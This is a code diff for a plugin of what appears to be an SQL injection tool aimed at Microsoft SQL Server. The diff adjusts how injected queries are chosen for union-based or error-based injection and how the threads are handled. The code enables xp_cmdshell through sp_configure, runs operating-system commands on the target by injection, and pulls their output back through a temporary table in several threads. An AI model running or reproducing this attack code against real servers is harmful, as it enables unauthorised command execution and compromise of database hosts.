@@ -139,17 +139,18 @@ class Worker(QtCore.QThread):
             self.xp_cmdshell()
         else:
             self.enable_xp_cmd()
+        self.progressSignal.emit(0, True)
         self.logSignal.emit("*** [" + PLUGIN_NAME + "]: TASK DONE ***")
     
     def enable_xp_cmd(self):
         self.vars['hex'] = core.txtproc.strToHex(\
         "sp_configure 'show advanced options',1;reconfigure;exec sp_configure 'xp_cmdshell',1;reconfigure", True)
-        query =  self.wq.buildQuery(core.txtproc.correctQstr(self.qstrings['exec_cmdshell']), self.vars)
+        query =  self.wq.buildQuery(core.txtproc.correctQstr(self.qstrings['mssql_error_based']['exec_cmdshell']), self.vars)
         self.wq.httpRequest(query, True, self.vars)
         self.progressSignal.emit(0, True)
         
     def xp_cmdshell(self):
-        execStr = core.txtproc.correctQstr(self.qstrings['exec_cmdshell'])
+        execStr = core.txtproc.correctQstr(self.qstrings['mssql_error_based']['exec_cmdshell'])
         
         #Delete tmp_table if already exist
         self.vars['hex'] = core.txtproc.strToHex("drop table dtpropertie", True)
@@ -168,6 +169,12 @@ class Worker(QtCore.QThread):
         query = self.wq.buildQuery(execStr, self.vars)
         self.wq.httpRequest(query, True, self.vars)
         
+        #Define query string for current injection type
+        if self.vars['inj_type'] == "union-based":
+            self.qstrings = self.qstrings['mssql_union_based']
+        else:
+            self.qstrings = self.qstrings['mssql_error_based']
+        
         #Getting count of rows in temp table
         self.vars['query_cmd'] = "select count(*) from dtpropertie"
         query = self.wq.buildQuery(core.txtproc.correctQstr(self.qstrings['query']), self.vars)
@@ -180,12 +187,16 @@ class Worker(QtCore.QThread):
         
         #Multithreadind
         tQueue = Queue()
+        threads = []
         for tNum in range(1, int(rowCount)):  
             tQueue.put(tNum)
         for i in range(self.vars['threads']):  
             t = threading.Thread(target=self.mtCmdOutput, args=(tNum, tQueue, rowCount)) 
+            threads.append(t)
             t.start()
             time.sleep(0.1)
+        for thread in threads:
+            thread.join()
             
     #Multithreaded xp_cmdshell output extracting
     def mtCmdOutput(self, tNum, tQueue, rowCount):
@@ -195,8 +206,7 @@ class Worker(QtCore.QThread):
                 tNum = tQueue.get_nowait()
             except Exception:  
                 break
-            self.vars['num'] = str(tNum)
-            query = self.wq.buildQuery(getRowStr, self.vars)
+            query = self.wq.buildQuery(getRowStr, self.vars, {'num' : str(tNum)})
             cmdResult = self.wq.httpRequest(query, False, self.vars)
             if cmdResult == "no_content":
                 self.log(sys._getframe().f_code.co_name + "() -> cmdResult", False)
@@ -205,5 +215,4 @@ class Worker(QtCore.QThread):
             time.sleep(0.1)
             tQueue.task_done()
             self.progressSignal.emit(int(rowCount) - 1, False)
-        self.progressSignal.emit(0, True)
         
